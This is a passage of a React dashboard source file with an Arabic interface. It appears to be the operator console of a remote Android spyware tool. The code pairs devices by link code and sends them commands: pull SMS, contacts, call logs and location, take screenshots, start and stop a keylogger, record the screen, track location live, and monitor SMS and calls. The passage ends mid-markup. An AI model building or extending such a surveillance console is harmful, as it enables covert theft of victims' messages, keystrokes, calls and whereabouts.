'use client'

import { useState, useEffect, useCallback, useRef } from 'react'
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '@/components/ui/card'
import { Button } from '@/components/ui/button'
import { Badge } from '@/components/ui/badge'
import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs'
import { ScrollArea } from '@/components/ui/scroll-area'
import { Input } from '@/components/ui/input'
import { Label } from '@/components/ui/label'
import { Switch } from '@/components/ui/switch'
import { Separator } from '@/components/ui/separator'
import { Dialog, DialogContent, DialogDescription, DialogFooter, DialogHeader, DialogTitle } from '@/components/ui/dialog'
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '@/components/ui/select'
import { Progress } from '@/components/ui/progress'
import { Alert, AlertDescription, AlertTitle } from '@/components/ui/alert'
import { 
  Smartphone, Activity, Settings, Terminal, FileText, Shield, Monitor, Wifi, 
  Battery, MapPin, Bell, RefreshCw, Link2, Trash2, Play, Square, Camera, Mic, 
  Volume2, Sun, Plane, Flashlight, Bluetooth, Database, Users, Clock, Server,
  AlertCircle, CheckCircle2, XCircle, Loader2, ChevronLeft, ChevronRight, Info,
  Globe, Phone, MessageSquare, Lock, Unlock, Key, Fingerprint, Zap, HardDrive,
  Layers, Search, FolderOpen, File, Copy, Move, Archive, Calendar, Mail,
  AlertTriangle
} from 'lucide-react'
import { COMMAND_REGISTRY, COMMAND_CATEGORIES, COMMAND_PARAMS, getCommandsByCategory, COMMAND_STATES, DEVICE_STATES, type CommandField, type CommandParams } from '@/lib/commands'
import { ErrorDetectorToggle } from '@/components/error-detector-panel'
import { errorDetector } from '@/lib/error-detector'

// Types
interface Device {
  id: string
  name: string | null
  model: string | null
  brand: string | null
  os: string | null
  androidVersion: number | null
  battery: string | null
  batteryStatus: string | null
  network: string | null
  networkType: string | null
  wifiConnected: boolean
  mobileData: boolean
  location: string | null
  active: boolean
  state: string | null
  storagePercent: number | null
  lastSeen: Date | null
  createdAt: Date
}

interface Command {
  id: string
  deviceId: string
  command: string
  params: string | null
  status: string
  priority: number
  progress: number
  progressMessage: string | null
  result: string | null
  errorMessage: string | null
  createdAt: Date
  completedAt: Date | null
  totalDuration: number | null
  device?: Device
}

interface Stats {
  devicesTotal: number
  devicesOnline: number
  commandsTotal: number
  commandsPending: number
  commandsCompleted: number
  eventsTotal: number
  totalRegisteredCommands: number
  serverTime: string
}

export default function Dashboard() {
  // State
  const [devices, setDevices] = useState<Device[]>([])
  const [commands, setCommands] = useState<Command[]>([])
  const [stats, setStats] = useState<Stats | null>(null)
  const [selectedDevice, setSelectedDevice] = useState<Device | null>(null)
  const [linkCode, setLinkCode] = useState<string | null>(null)
  const [loading, setLoading] = useState(false)
  const [activeTab, setActiveTab] = useState('dashboard')
  const [activeCategory, setActiveCategory] = useState('data')
  
  // Command Modal State
  const [cmdModalOpen, setCmdModalOpen] = useState(false)
  const [currentCommand, setCurrentCommand] = useState<string>('')
  const [currentCmdParams, setCurrentCmdParams] = useState<CommandParams | null>(null)
  const [paramValues, setParamValues] = useState<Record<string, string | number | boolean>>({})
  
  // WebSocket State
  const [wsConnected, setWsConnected] = useState(false)
  const wsRef = useRef<WebSocket | null>(null)

  // Fetch data function (doesn't call setState directly in effect body)
  const fetchData = useCallback(async () => {
    const startTime = Date.now()
    try {
      const [devicesRes, commandsRes, statsRes] = await Promise.all([
        fetch('/api/devices'),
        fetch('/api/commands?limit=50'),
        fetch('/api/stats')
      ])

      const devicesData = await devicesRes.json()
      const commandsData = await commandsRes.json()
      const statsData = await statsRes.json()

      if (devicesData.ok) setDevices(devicesData.devices)
      if (commandsData.ok) setCommands(commandsData.commands)
      if (statsData.ok) setStats(statsData.stats)

      errorDetector.logAction({
        action: 'Fetch Data',
        component: 'Dashboard',
        success: true,
        duration: Date.now() - startTime
      })
    } catch (error: any) {
      errorDetector.logAction({
        action: 'Fetch Data',
        component: 'Dashboard',
        success: false,
        duration: Date.now() - startTime,
        error: error.message
      })
      errorDetector.logError({
        type: 'api',
        message: `Error fetching data: ${error.message}`,
        component: 'Dashboard'
      })
    }
  }, [])

  // Initial data fetch and polling
  useEffect(() => {
    // Trigger initial fetch via timeout to avoid synchronous setState in effect
    const timeoutId = setTimeout(() => {
      fetchData().catch(console.error)
    }, 0)
    const interval = setInterval(() => fetchData().catch(console.error), 10000)
    return () => {
      clearTimeout(timeoutId)
      clearInterval(interval)
    }
  }, [fetchData])

  // WebSocket connection
  useEffect(() => {
    const connectWs = () => {
      const wsUrl = `${window.location.protocol === 'https:' ? 'wss:' : 'ws:'}//${window.location.host}/api/ws`
      wsRef.current = new WebSocket(wsUrl)
      
      wsRef.current.onopen = () => {
        setWsConnected(true)
        console.log('WebSocket connected')
      }
      
      wsRef.current.onclose = () => {
        setWsConnected(false)
        console.log('WebSocket disconnected')
        setTimeout(connectWs, 5000)
      }
      
      wsRef.current.onmessage = (event) => {
        try {
          const data = JSON.parse(event.data)
          if (data.type === 'command_update' || data.type === 'device_status') {
            fetchData().catch(console.error)
          }
        } catch (e) {
          console.error('WebSocket message error:', e)
        }
      }
    }
    
    connectWs()
    return () => wsRef.current?.close()
  }, [fetchData])

  // Generate link code
  const generateLinkCode = async () => {
    setLoading(true)
    try {
      const res = await fetch('/api/link-code', { method: 'POST' })
      const data = await res.json()
      if (data.ok) {
        setLinkCode(data.code)
      }
    } catch (error) {
      console.error('Error generating link code:', error)
    }
    setLoading(false)
  }

  // Send command
  const sendCommand = async (cmd: string, params?: Record<string, unknown>) => {
    if (!selectedDevice) return
    setLoading(true)
    const startTime = Date.now()
    try {
      const res = await fetch('/api/commands', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          deviceId: selectedDevice.id,
          command: cmd,
          params
        })
      })
      const data = await res.json()
      if (data.ok) {
        fetchData()
        errorDetector.logAction({
          action: `Send Command: ${cmd}`,
          component: 'Dashboard',
          success: true,
          duration: Date.now() - startTime,
          data: { deviceId: selectedDevice.id, params }
        })
      } else {
        errorDetector.logError({
          type: 'api',
          message: `Command failed: ${data.error || 'Unknown error'}`,
          component: 'Dashboard',
          action: cmd
        })
      }
    } catch (error: any) {
      errorDetector.logAction({
        action: `Send Command: ${cmd}`,
        component: 'Dashboard',
        success: false,
        duration: Date.now() - startTime,
        error: error.message
      })
      errorDetector.logError({
        type: 'api',
        message: `Error sending command: ${error.message}`,
        component: 'Dashboard',
        action: cmd
      })
    }
    setLoading(false)
  }

  // Open command modal with parameters
  const openCommandModal = (cmdName: string) => {
    const params = COMMAND_PARAMS[cmdName]
    const cmdInfo = Object.entries(COMMAND_REGISTRY).find(([, info]) => info.cmd === cmdName)
    
    if (params) {
      setCurrentCommand(cmdName)
      setCurrentCmdParams(params)
      // Set default values
      const defaults: Record<string, string | number | boolean> = {}
      params.fields.forEach(f => {
        if (f.default !== undefined) defaults[f.name] = f.default
      })
      setParamValues(defaults)
      setCmdModalOpen(true)
    } else if (cmdInfo) {
      // No params needed, execute directly
      sendCommand(cmdInfo[1].cmd)
    }
  }

  // Handle parameter form submission
  const handleParamSubmit = () => {
    if (!currentCommand || !selectedDevice) return
    
    const cmdInfo = Object.entries(COMMAND_REGISTRY).find(([, info]) => info.cmd === currentCommand)
    if (!cmdInfo) return
    
    // Check confirmation
    if (currentCmdParams?.confirm && !confirm(currentCmdParams.confirm)) {
      return
    }
    
    sendCommand(cmdInfo[1].cmd, paramValues)
    setCmdModalOpen(false)
    setParamValues({})
  }

  // Delete device
  const deleteDevice = async (deviceId: string) => {
    if (!confirm('هل أنت متأكد من إلغاء ربط هذا الجهاز؟')) return
    try {
      await fetch(`/api/devices/${deviceId}`, { method: 'DELETE' })
      setSelectedDevice(null)
      fetchData()
    } catch (error) {
      console.error('Error deleting device:', error)
    }
  }

  const getStatusColor = (status: string) => {
    const state = COMMAND_STATES[status as keyof typeof COMMAND_STATES]
    return state?.color || 'gray'
  }

  const formatTime = (date: Date | null | string) => {
    if (!date) return '-'
    return new Date(date).toLocaleString('ar-EG')
  }

  const getDeviceStateInfo = (device: Device) => {
    if (!device.active) return DEVICE_STATES.offline
    if (device.state && DEVICE_STATES[device.state as keyof typeof DEVICE_STATES]) {
      return DEVICE_STATES[device.state as keyof typeof DEVICE_STATES]
    }
    if (device.batteryStatus === 'charging') return DEVICE_STATES.charging
    if (device.battery && parseInt(device.battery) <= 20) return DEVICE_STATES.low_battery
    return DEVICE_STATES.online
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-slate-900 via-slate-800 to-slate-900 text-white" dir="rtl">
      {/* Header */}
      <header className="border-b border-slate-700 bg-slate-900/50 backdrop-blur-sm sticky top-0 z-50">
        <div className="container mx-auto px-4 py-3">
          <div className="flex items-center justify-between">
            <div className="flex items-center gap-3">
              <div className="w-10 h-10 bg-gradient-to-br from-red-500 to-red-700 rounded-xl flex items-center justify-center shadow-lg shadow-red-500/20">
                <Shield className="w-6 h-6" />
              </div>
              <div>
                <h1 className="text-xl font-bold bg-gradient-to-r from-white to-slate-300 bg-clip-text text-transparent">أبو الزهراء</h1>
                <p className="text-xs text-slate-400">لوحة التحكم المتكاملة v3.5</p>
              </div>
            </div>
            <div className="flex items-center gap-3">
              <div className="flex items-center gap-2 text-xs text-slate-400">
                <div className={`w-2 h-2 rounded-full ${wsConnected ? 'bg-green-500' : 'bg-yellow-500'} animate-pulse`} />
                <span>{wsConnected ? 'متصل' : 'غير متصل'}</span>
              </div>
              <Badge variant="outline" className="bg-green-500/10 text-green-400 border-green-500/50">
                <Activity className="w-3 h-3 ml-1" />
                نشط
              </Badge>
              <Button variant="outline" size="icon" onClick={fetchData} className="border-slate-600 hover:bg-slate-700">
                <RefreshCw className="w-4 h-4" />
              </Button>
            </div>
          </div>
        </div>
      </header>

      {/* Main Content */}
      <main className="container mx-auto px-4 py-6">
        <Tabs value={activeTab} onValueChange={setActiveTab} className="space-y-6">
          <TabsList className="bg-slate-800/50 border border-slate-700 flex-wrap h-auto gap-1 p-1">
            <TabsTrigger value="dashboard" className="data-[state=active]:bg-red-600 data-[state=active]:text-white">
              <Activity className="w-4 h-4 ml-2" />
              الرئيسية
            </TabsTrigger>
            <TabsTrigger value="devices" className="data-[state=active]:bg-red-600">
              <Smartphone className="w-4 h-4 ml-2" />
              الأجهزة
            </TabsTrigger>
            <TabsTrigger value="commands" className="data-[state=active]:bg-red-600">
              <Terminal className="w-4 h-4 ml-2" />
              الأوامر
            </TabsTrigger>
            <TabsTrigger value="monitor" className="data-[state=active]:bg-red-600">
              <Monitor className="w-4 h-4 ml-2" />
              المراقبة
            </TabsTrigger>
            <TabsTrigger value="health" className="data-[state=active]:bg-red-600">
              <Battery className="w-4 h-4 ml-2" />
              الصحة
            </TabsTrigger>
            <TabsTrigger value="logs" className="data-[state=active]:bg-red-600">
              <FileText className="w-4 h-4 ml-2" />
              السجلات
            </TabsTrigger>
          </TabsList>

          {/* Dashboard Tab */}
          <TabsContent value="dashboard" className="space-y-6">
            {/* Stats Cards */}
            <div className="grid grid-cols-2 md:grid-cols-4 lg:grid-cols-6 gap-4">
              <Card className="bg-slate-800/50 border-slate-700 hover:border-blue-500/50 transition-colors">
                <CardContent className="p-4">
                  <div className="flex items-center justify-between">
                    <div>
                      <p className="text-slate-400 text-xs">الأجهزة</p>
                      <p className="text-2xl font-bold">{stats?.devicesTotal || 0}</p>
                    </div>
                    <div className="w-10 h-10 bg-blue-500/20 rounded-lg flex items-center justify-center">
                      <Smartphone className="w-5 h-5 text-blue-400" />
                    </div>
                  </div>
                  <p className="text-xs text-green-400 mt-2">🟢 {stats?.devicesOnline || 0} متصل</p>
                </CardContent>
              </Card>

              <Card className="bg-slate-800/50 border-slate-700 hover:border-yellow-500/50 transition-colors">
                <CardContent className="p-4">
                  <div className="flex items-center justify-between">
                    <div>
                      <p className="text-slate-400 text-xs">معلق</p>
                      <p className="text-2xl font-bold">{stats?.commandsPending || 0}</p>
                    </div>
                    <div className="w-10 h-10 bg-yellow-500/20 rounded-lg flex items-center justify-center">
                      <Clock className="w-5 h-5 text-yellow-400" />
                    </div>
                  </div>
                  <p className="text-xs text-slate-400 mt-2">⏳ بانتظار التنفيذ</p>
                </CardContent>
              </Card>

              <Card className="bg-slate-800/50 border-slate-700 hover:border-green-500/50 transition-colors">
                <CardContent className="p-4">
                  <div className="flex items-center justify-between">
                    <div>
                      <p className="text-slate-400 text-xs">مكتمل</p>
                      <p className="text-2xl font-bold">{stats?.commandsCompleted || 0}</p>
                    </div>
                    <div className="w-10 h-10 bg-green-500/20 rounded-lg flex items-center justify-center">
                      <CheckCircle2 className="w-5 h-5 text-green-400" />
                    </div>
                  </div>
                  <p className="text-xs text-green-400 mt-2">✅ تم بنجاح</p>
                </CardContent>
              </Card>

              <Card className="bg-slate-800/50 border-slate-700 hover:border-purple-500/50 transition-colors">
                <CardContent className="p-4">
                  <div className="flex items-center justify-between">
                    <div>
                      <p className="text-slate-400 text-xs">الأوامر</p>
                      <p className="text-2xl font-bold">{stats?.totalRegisteredCommands || 200}+</p>
                    </div>
                    <div className="w-10 h-10 bg-purple-500/20 rounded-lg flex items-center justify-center">
                      <Terminal className="w-5 h-5 text-purple-400" />
                    </div>
                  </div>
                  <p className="text-xs text-slate-400 mt-2">📋 متاحة</p>
                </CardContent>
              </Card>

              <Card className="bg-slate-800/50 border-slate-700 hover:border-cyan-500/50 transition-colors">
                <CardContent className="p-4">
                  <div className="flex items-center justify-between">
                    <div>
                      <p className="text-slate-400 text-xs">إجمالي</p>
                      <p className="text-2xl font-bold">{stats?.commandsTotal || 0}</p>
                    </div>
                    <div className="w-10 h-10 bg-cyan-500/20 rounded-lg flex items-center justify-center">
                      <Database className="w-5 h-5 text-cyan-400" />
                    </div>
                  </div>
                  <p className="text-xs text-slate-400 mt-2">📊 الأوامر</p>
                </CardContent>
              </Card>

              <Card className="bg-slate-800/50 border-slate-700 hover:border-orange-500/50 transition-colors">
                <CardContent className="p-4">
                  <div className="flex items-center justify-between">
                    <div>
                      <p className="text-slate-400 text-xs">الأحداث</p>
                      <p className="text-2xl font-bold">{stats?.eventsTotal || 0}</p>
                    </div>
                    <div className="w-10 h-10 bg-orange-500/20 rounded-lg flex items-center justify-center">
                      <FileText className="w-5 h-5 text-orange-400" />
                    </div>
                  </div>
                  <p className="text-xs text-slate-400 mt-2">📝 مسجلة</p>
                </CardContent>
              </Card>
            </div>

            {/* Quick Actions & Recent Devices */}
            <div className="grid lg:grid-cols-2 gap-6">
              {/* Quick Actions */}
              <Card className="bg-slate-800/50 border-slate-700">
                <CardHeader>
                  <CardTitle className="text-lg flex items-center gap-2">
                    <Zap className="w-5 h-5 text-yellow-400" />
                    إجراءات سريعة
                  </CardTitle>
                  <CardDescription>أوامر سريعة للجهاز الأول المتصل</CardDescription>
                </CardHeader>
                <CardContent>
                  {devices.filter(d => d.active).slice(0, 1).map(device => (
                    <div key={device.id} className="grid grid-cols-2 md:grid-cols-4 gap-3">
                      <Button 
                        className="bg-slate-700/50 hover:bg-slate-600 justify-start border border-slate-600"
                        onClick={() => { setSelectedDevice(device); sendCommand('get_location'); }}
                      >
                        <MapPin className="w-4 h-4 ml-2 text-blue-400" />
                        الموقع
                      </Button>
                      <Button 
                        className="bg-slate-700/50 hover:bg-slate-600 justify-start border border-slate-600"
                        onClick={() => { setSelectedDevice(device); sendCommand('screenshot'); }}
                      >
                        <Camera className="w-4 h-4 ml-2 text-purple-400" />
                        لقطة
                      </Button>
                      <Button 
                        className="bg-slate-700/50 hover:bg-slate-600 justify-start border border-slate-600"
                        onClick={() => { setSelectedDevice(device); sendCommand('get_battery'); }}
                      >
                        <Battery className="w-4 h-4 ml-2 text-green-400" />
                        البطارية
                      </Button>
                      <Button 
                        className="bg-slate-700/50 hover:bg-slate-600 justify-start border border-slate-600"
                        onClick={() => { setSelectedDevice(device); sendCommand('get_sms'); }}
                      >
                        <MessageSquare className="w-4 h-4 ml-2 text-cyan-400" />
                        الرسائل
                      </Button>
                      <Button 
                        className="bg-slate-700/50 hover:bg-slate-600 justify-start border border-slate-600"
                        onClick={() => { setSelectedDevice(device); sendCommand('get_contacts'); }}
                      >
                        <Users className="w-4 h-4 ml-2 text-orange-400" />
                        جهات الاتصال
                      </Button>
                      <Button 
                        className="bg-slate-700/50 hover:bg-slate-600 justify-start border border-slate-600"
                        onClick={() => { setSelectedDevice(device); sendCommand('get_calls'); }}
                      >
                        <Phone className="w-4 h-4 ml-2 text-pink-400" />
                        المكالمات
                      </Button>
                      <Button 
                        className="bg-slate-700/50 hover:bg-slate-600 justify-start border border-slate-600"
                        onClick={() => { setSelectedDevice(device); sendCommand('ring'); }}
                      >
                        <Bell className="w-4 h-4 ml-2 text-yellow-400" />
                        رنين
                      </Button>
                      <Button 
                        className="bg-slate-700/50 hover:bg-slate-600 justify-start border border-slate-600"
                        onClick={() => { setSelectedDevice(device); sendCommand('get_info'); }}
                      >
                        <Info className="w-4 h-4 ml-2 text-slate-400" />
                        معلومات
                      </Button>
                    </div>
                  ))}
                  {devices.filter(d => d.active).length === 0 && (
                    <div className="text-center text-slate-400 py-8">
                      <Smartphone className="w-12 h-12 mx-auto mb-3 opacity-50" />
                      <p>لا توجد أجهزة متصلة</p>
                      <p className="text-sm mt-1">استخدم زر "ربط جهاز" لإضافة جهاز جديد</p>
                    </div>
                  )}
                </CardContent>
              </Card>

              {/* Recent Commands */}
              <Card className="bg-slate-800/50 border-slate-700">
                <CardHeader>
                  <CardTitle className="text-lg flex items-center gap-2">
                    <Clock className="w-5 h-5 text-blue-400" />
                    آخر الأوامر
                  </CardTitle>
                </CardHeader>
                <CardContent>
                  <ScrollArea className="h-64">
                    {commands.slice(0, 15).map(cmd => (
                      <div key={cmd.id} className="flex items-center justify-between py-3 border-b border-slate-700/50 last:border-0">
                        <div className="flex-1">
                          <p className="font-medium text-sm">{cmd.command}</p>
                          <p className="text-xs text-slate-400">{cmd.device?.name || cmd.deviceId}</p>
                        </div>
                        <div className="flex items-center gap-2">
                          {cmd.progress > 0 && cmd.progress < 100 && (
                            <div className="w-16">
                              <Progress value={cmd.progress} className="h-1" />
                            </div>
                          )}
                          <Badge className={`bg-${getStatusColor(cmd.status)}-500/20 text-${getStatusColor(cmd.status)}-400 border-${getStatusColor(cmd.status)}-500/50 text-xs`}>
                            {COMMAND_STATES[cmd.status as keyof typeof COMMAND_STATES]?.label || cmd.status}
                          </Badge>
                        </div>
                      </div>
                    ))}
                    {commands.length === 0 && (
                      <div className="text-center text-slate-400 py-8">
                        <Terminal className="w-12 h-12 mx-auto mb-3 opacity-50" />
                        <p>لا توجد أوامر</p>
                      </div>
                    )}
                  </ScrollArea>
                </CardContent>
              </Card>
            </div>
          </TabsContent>

          {/* Devices Tab */}
          <TabsContent value="devices" className="space-y-6">
            {/* Link Device */}
            <Card className="bg-slate-800/50 border-slate-700">
              <CardHeader>
                <CardTitle className="text-lg flex items-center gap-2">
                  <Link2 className="w-5 h-5 text-green-400" />
                  ربط جهاز جديد
                </CardTitle>
                <CardDescription>أنشئ كود ربط وأدخله في تطبيق الأندرويد</CardDescription>
              </CardHeader>
              <CardContent>
                <div className="flex items-center gap-4 flex-wrap">
                  <Button 
                    onClick={generateLinkCode}
                    disabled={loading}
                    className="bg-gradient-to-r from-red-600 to-red-700 hover:from-red-500 hover:to-red-600 shadow-lg shadow-red-500/20"
                  >
                    {loading ? (
                      <Loader2 className="w-4 h-4 ml-2 animate-spin" />
                    ) : (
                      <Link2 className="w-4 h-4 ml-2" />
                    )}
                    إنشاء كود
                  </Button>
                  {linkCode && (
                    <div className="flex items-center gap-3 bg-slate-700/50 px-5 py-3 rounded-lg border border-slate-600">
                      <span className="text-slate-400 text-sm">الكود:</span>
                      <code className="text-2xl font-mono font-bold text-red-400 tracking-wider">{linkCode}</code>
                    </div>
                  )}
                </div>
              </CardContent>
            </Card>

            {/* Devices List */}
            <div className="grid md:grid-cols-2 lg:grid-cols-3 gap-4">
              {devices.map(device => {
                const stateInfo = getDeviceStateInfo(device)
                return (
                  <Card 
                    key={device.id} 
                    className={`bg-slate-800/50 border-slate-700 cursor-pointer transition-all hover:shadow-lg ${
                      selectedDevice?.id === device.id ? 'border-red-500 ring-1 ring-red-500/50' : 'hover:border-slate-500'
                    }`}
                    onClick={() => setSelectedDevice(device)}
                  >
                    <CardContent className="p-4">
                      <div className="flex items-start justify-between mb-3">
                        <div className="flex items-center gap-2">
                          <div className={`w-3 h-3 rounded-full ${
                            stateInfo.color === 'green' ? 'bg-green-500' :
                            stateInfo.color === 'red' ? 'bg-red-500' :
                            stateInfo.color === 'orange' ? 'bg-orange-500' :
                            stateInfo.color === 'yellow' ? 'bg-yellow-500' :
                            'bg-slate-500'
                          }`} />
                          <h3 className="font-bold">{device.name || device.id}</h3>
                        </div>
                        <Badge variant="outline" className={`text-xs ${
                          device.active ? 'border-green-500 text-green-400' : 'border-red-500 text-red-400'
                        }`}>
                          {stateInfo.icon} {stateInfo.label}
                        </Badge>
                      </div>
                      
                      <div className="text-sm text-slate-400 mb-3">
                        {device.model || 'غير محدد'} • {device.os || '-'}
                      </div>
                      
                      <div className="grid grid-cols-2 gap-2 text-xs">
                        <div className="flex items-center gap-1 text-slate-400">
                          <Battery className="w-3 h-3" />
                          {device.battery || '-'}%
                          {device.batteryStatus === 'charging' && <span className="text-green-400">⚡</span>}
                        </div>
                        <div className="flex items-center gap-1 text-slate-400">
                          <Wifi className="w-3 h-3" />
                          {device.networkType || '-'}
                        </div>
                        {device.storagePercent !== null && (
                          <div className="flex items-center gap-1 text-slate-400">
                            <HardDrive className="w-3 h-3" />
                            {device.storagePercent.toFixed(0)}%
                          </div>
                        )}
                        {device.location && (
                          <div className="flex items-center gap-1 text-slate-400">
                            <MapPin className="w-3 h-3" />
                            متوفر
                          </div>
                        )}
                      </div>
                      
                      <p className="text-xs text-slate-500 mt-3">
                        آخر ظهور: {formatTime(device.lastSeen)}
                      </p>
                    </CardContent>
                  </Card>
                )
              })}
              {devices.length === 0 && (
                <div className="col-span-full text-center py-12 text-slate-400">
                  <Smartphone className="w-16 h-16 mx-auto mb-4 opacity-50" />
                  <p className="text-lg">لا توجد أجهزة مربوطة</p>
                  <p className="text-sm mt-2">استخدم زر "إنشاء كود" لربط جهاز جديد</p>
                </div>
              )}
            </div>
          </TabsContent>

          {/* Commands Tab */}
          <TabsContent value="commands" className="space-y-6">
            {selectedDevice ? (
              <>
                {/* Selected Device Info */}
                <Card className="bg-slate-800/50 border-slate-700">
                  <CardContent className="p-4">
                    <div className="flex items-center justify-between flex-wrap gap-4">
                      <div className="flex items-center gap-3">
                        <div className={`w-3 h-3 rounded-full ${selectedDevice.active ? 'bg-green-500' : 'bg-red-500'}`} />
                        <div>
                          <h3 className="font-bold">{selectedDevice.name || selectedDevice.id}</h3>
                          <p className="text-sm text-slate-400">{selectedDevice.model} • {selectedDevice.os}</p>
                        </div>
                      </div>
                      <div className="flex items-center gap-2">
                        <Button variant="outline" size="sm" onClick={() => setSelectedDevice(null)} className="border-slate-600">
                          إلغاء التحديد
                        </Button>
                        <Button variant="destructive" size="sm" onClick={() => deleteDevice(selectedDevice.id)}>
                          <Trash2 className="w-4 h-4" />
                        </Button>
                      </div>
                    </div>
                  </CardContent>
                </Card>

                {/* Commands Categories */}
                <div className="grid lg:grid-cols-4 gap-6">
                  {/* Categories Sidebar */}
                  <Card className="bg-slate-800/50 border-slate-700 lg:col-span-1">
                    <CardHeader>
                      <CardTitle className="text-base">التصنيفات</CardTitle>
                    </CardHeader>
                    <CardContent className="p-2">
                      <div className="space-y-1">
                        {Object.entries(COMMAND_CATEGORIES).map(([key, cat]) => (
                          <Button
                            key={key}
                            variant={activeCategory === key ? "default" : "ghost"}
                            className={`w-full justify-start ${activeCategory === key ? 'bg-red-600 hover:bg-red-700' : 'hover:bg-slate-700'}`}
                            onClick={() => setActiveCategory(key)}
                          >
                            <span className="ml-2">{cat.icon}</span>
                            {cat.label}
                          </Button>
                        ))}
                      </div>
                    </CardContent>
                  </Card>

                  {/* Commands Grid */}
                  <Card className="bg-slate-800/50 border-slate-700 lg:col-span-3">
                    <CardHeader>
                      <CardTitle className="text-base">
                        {COMMAND_CATEGORIES[activeCategory]?.icon} {COMMAND_CATEGORIES[activeCategory]?.label}
                      </CardTitle>
                      <CardDescription>
                        {getCommandsByCategory(activeCategory).length} أمر متاح
                      </CardDescription>
                    </CardHeader>
                    <CardContent>
                      <div className="grid grid-cols-2 md:grid-cols-3 gap-2">
                        {getCommandsByCategory(activeCategory).map((cmd) => (
                          <Button
                            key={cmd.name}
                            variant="outline"
                            className="justify-start bg-slate-700/30 hover:bg-slate-600 border-slate-600 h-auto py-3"
                            onClick={() => openCommandModal(cmd.cmd)}
                            disabled={loading || !selectedDevice.active}
                          >
                            <span className="ml-2 text-lg">{cmd.emoji}</span>
                            <span className="text-sm">{cmd.desc}</span>
                            {COMMAND_PARAMS[cmd.cmd] && <span className="mr-auto text-slate-400">⚙️</span>}
                          </Button>
                        ))}
                      </div>
                    </CardContent>
                  </Card>
                </div>
              </>
            ) : (
              <Card className="bg-slate-800/50 border-slate-700">
                <CardContent className="py-16 text-center">
                  <AlertCircle className="w-16 h-16 mx-auto mb-4 text-slate-400 opacity-50" />
                  <p className="text-slate-400 text-lg">اختر جهازاً من قائمة الأجهزة للتحكم به</p>
                  <Button 
                    variant="outline" 
                    className="mt-4 border-slate-600 hover:bg-slate-700"
                    onClick={() => setActiveTab('devices')}
                  >
                    عرض الأجهزة
                  </Button>
                </CardContent>
              </Card>
            )}
          </TabsContent>

          {/* Monitor Tab */}
          <TabsContent value="monitor" className="space-y-6">
            <Card className="bg-slate-800/50 border-slate-700">
              <CardHeader>
                <CardTitle className="text-lg flex items-center gap-2">
                  <Monitor className="w-5 h-5 text-purple-400" />
                  أدوات المراقبة
                </CardTitle>
              </CardHeader>
              <CardContent>
                {selectedDevice ? (
                  <div className="grid md:grid-cols-2 gap-6">
                    <div className="space-y-4">
                      <h3 className="font-medium text-slate-300">📍 تتبع الموقع</h3>
                      <div className="grid grid-cols-2 gap-2">
                        <Button variant="outline" className="bg-slate-700/30 border-slate-600" onClick={() => sendCommand('location_live')}>
                          <MapPin className="w-4 h-4 ml-2 text-green-400" />
                          تتبع مباشر
                        </Button>
                        <Button variant="outline" className="bg-slate-700/30 border-slate-600" onClick={() => sendCommand('location_stop')}>
                          <Square className="w-4 h-4 ml-2 text-red-400" />
                          إيقاف التتبع
                        </Button>
                        <Button variant="outline" className="bg-slate-700/30 border-slate-600" onClick={() => sendCommand('get_location_history')}>
                          <Clock className="w-4 h-4 ml-2 text-blue-400" />
                          سجل المواقع
                        </Button>
                        <Button variant="outline" className="bg-slate-700/30 border-slate-600" onClick={() => openCommandModal('geo_add')}>
                          <Layers className="w-4 h-4 ml-2 text-purple-400" />
                          إضافة منطقة
                        </Button>
                      </div>
                    </div>
                    
                    <div className="space-y-4">
                      <h3 className="font-medium text-slate-300">⌨️ تسجيل المفاتيح</h3>
                      <div className="grid grid-cols-2 gap-2">
                        <Button variant="outline" className="bg-slate-700/30 border-slate-600" onClick={() => sendCommand('keylogger_start')}>
                          <Play className="w-4 h-4 ml-2 text-green-400" />
                          بدء التسجيل
                        </Button>
                        <Button variant="outline" className="bg-slate-700/30 border-slate-600" onClick={() => sendCommand('keylogger_stop')}>
                          <Square className="w-4 h-4 ml-2 text-red-400" />
                          إيقاف التسجيل
                        </Button>
                        <Button variant="outline" className="bg-slate-700/30 border-slate-600 col-span-2" onClick={() => sendCommand('get_keylogger')}>
                          <FileText className="w-4 h-4 ml-2 text-yellow-400" />
                          جلب البيانات
                        </Button>
                      </div>
                    </div>
                    
                    <div className="space-y-4">
                      <h3 className="font-medium text-slate-300">🎬 تسجيل الشاشة</h3>
                      <div className="grid grid-cols-2 gap-2">
                        <Button variant="outline" className="bg-slate-700/30 border-slate-600" onClick={() => sendCommand('screen_record_start')}>
                          <div className="w-2 h-2 bg-red-500 rounded-full ml-2 animate-pulse" />
                          بدء التسجيل
                        </Button>
                        <Button variant="outline" className="bg-slate-700/30 border-slate-600" onClick={() => sendCommand('stop_screen')}>
                          <Square className="w-4 h-4 ml-2 text-red-400" />
                          إيقاف التسجيل
                        </Button>
                      </div>
                    </div>
                    
                    <div className="space-y-4">
                      <h3 className="font-medium text-slate-300">📱 مراقبة أخرى</h3>
                      <div className="grid grid-cols-2 gap-2">
                        <Button variant="outline" className="bg-slate-700/30 border-slate-600" onClick={() => sendCommand('sms_monitor')}>
                          <MessageSquare className="w-4 h-4 ml-2 text-cyan-400" />
                          مراقبة SMS
                        </Button>
                        <Button variant="outline" className="bg-slate-700/30 border-slate-600" onClick={() => sendCommand('call_monitor')}>
                          <Phone className="w-4 h-4 ml-2 text-pink-400" />
                          مراقبة المكالمات
                        </Button>
                      </div>
                    </div>
                  </div>
                ) : (
                  <div className="text-center text-slate-400 py-8">
                    <Monitor className="w-12 h-12 mx-auto mb-3 opacity-50" />
                    <p>اختر جهازاً أولاً من تبويب الأجهزة</p>
                  </div>
                )}
              </CardContent>
            </Card>
          </TabsContent>

          {/* Health Tab */}
          <TabsContent value="health" className="space-y-6">
            <div className="grid md:grid-cols-2 lg:grid-cols-3 gap-4">
              {devices.map(device => {
                const stateInfo = getDeviceStateInfo(device)
                return (
                  <Card key={device.id} className="bg-slate-800/50 border-slate-700">
                    <CardHeader className="pb-2">
                      <CardTitle className="text-base flex items-center gap-2">
                        <span>{stateInfo.icon}</span>
                        {device.name || device.id}
                      </CardTitle>
                    </CardHeader>
                    <CardContent>
                      <div className="space-y-4">
                        {/* Battery */}
                        <div>
                          <div className="flex items-center justify-between text-sm mb-1">
                            <span className="text-slate-400 flex items-center gap-1">
